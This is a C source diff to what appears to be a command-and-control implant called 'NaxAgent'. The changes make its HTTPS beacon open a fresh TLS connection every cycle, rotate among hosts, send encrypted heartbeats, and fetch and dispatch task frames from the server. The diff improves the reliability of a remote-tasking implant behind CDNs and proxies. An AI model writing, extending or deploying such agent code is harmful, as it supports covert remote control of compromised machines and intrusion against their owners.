@@ -578,6 +578,7 @@ static int https_tls_connect(NaxAgent *a)
     g_ssl = SSL_new(g_ssl_ctx);
     if (!g_ssl) { close(sock); return -1; }
     SSL_set_fd(g_ssl, sock);
+    SSL_set_tlsext_host_name(g_ssl, host);
     if (SSL_connect(g_ssl) != 1) {
         SSL_free(g_ssl); g_ssl = NULL; close(sock); return -1;
     }
@@ -654,6 +655,18 @@ static uint8_t *https_post(NaxAgent *a,
         "Content-Length: %u\r\n", send_len);
 
     pthread_mutex_lock(&g_https_mutex);
+
+    /* Reconnect if the connection was closed by a previous operation
+     * (e.g. https_get closing after the heartbeat). Each operation
+     * owns its own connection — no reuse across GET/POST. */
+    if (!g_ssl || g_sock < 0) {
+        if (https_tls_connect(a) < 0) {
+            pthread_mutex_unlock(&g_https_mutex);
+            if (enc_body) free(enc_body);
+            return NULL;
+        }
+    }
+
     uint8_t *resp = NULL;
     if (tls_write_all(req, req_len) == 0 &&
         tls_write_all(hdrs, (int)hdr_len) == 0 &&
@@ -663,6 +676,7 @@ static uint8_t *https_post(NaxAgent *a,
         int clen = read_http_headers();
         resp = tls_read_body(clen, out_resp_len);
     }
+    https_cleanup();                 /* close connection after POST */
     pthread_mutex_unlock(&g_https_mutex);
 
     if (enc_body) free(enc_body);
@@ -709,6 +723,17 @@ static uint8_t *https_get(NaxAgent *a,
         uri, host, g_user_agent);
 
     pthread_mutex_lock(&g_https_mutex);
+
+    /* Ensure connection is alive. In normal flow nax_https_main already
+     * opened it, but be defensive: if a previous POST closed it, reconnect. */
+    if (!g_ssl || g_sock < 0) {
+        if (https_tls_connect(a) < 0) {
+            pthread_mutex_unlock(&g_https_mutex);
+            *out_resp_len = UINT32_MAX;
+            return NULL;
+        }
+    }
+
     uint8_t *resp = NULL;
     int _get_ok = (tls_write_all(req, req_len) == 0 &&
                    tls_write_all(hdrs, (int)hdr_len) == 0 &&
@@ -723,6 +748,7 @@ static uint8_t *https_get(NaxAgent *a,
     } else {
         *out_resp_len = UINT32_MAX; /* write failed */
     }
+    https_cleanup();                 /* close connection after GET */
     pthread_mutex_unlock(&g_https_mutex);
 
     /* Decode server output (base64url → raw AES-CBC) */
@@ -1040,18 +1066,21 @@ void nax_https_main(NaxAgent *a)
         }
         if (!a->running) break;
 
-        int hb_host_ok = 1; /* reuse REGISTER connection for first heartbeat */
+        /* ── Heartbeat loop ─────────────────────────────────────────
+         * No connection reuse: each iteration opens a fresh TLS
+         * connection, sends the heartbeat, and closes it. This avoids
+         * the alternating success/failure pattern caused by stale
+         * keep-alive sockets behind CDNs/proxies.
+         */
         while (a->running) {
-            if (!hb_host_ok) {
+            /* Fresh connection every cycle */
+            https_rotate_host(a);
+            https_cleanup();
+            while (a->running && https_tls_connect(a) < 0) {
+                sleep(3);
                 https_rotate_host(a);
-                https_cleanup();
-                while (a->running && https_tls_connect(a) < 0) {
-                    sleep(3);
-                    https_rotate_host(a);
-                }
-                if (!a->running) break;
             }
-            hb_host_ok = 0;
+            if (!a->running) break;
 
             /* GET with encrypted heartbeat */
             uint8_t hb_frame[256]; uint32_t hb_frame_len = sizeof(hb_frame);
@@ -1075,14 +1104,11 @@ void nax_https_main(NaxAgent *a)
             if (!resp) {
                 if (resp_len == 0) {
                     DBG("GET response: EmptyResp (no tasks) — connection OK");
-                    hb_host_ok = 1;
                 } else {
-                    DBG_ERR("GET failed — network error resp_len=%u, cleanup+reconnect", resp_len);
-                    https_cleanup();
+                    DBG_ERR("GET failed — network error resp_len=%u, will reconnect next cycle", resp_len);
                 }
             } else {
                 DBG_OK("GET response: %u bytes — processing frames", resp_len);
-                hb_host_ok = 1;
             }
 
             /* Process task frames — had_tasks only if real TASK frames were dispatched */
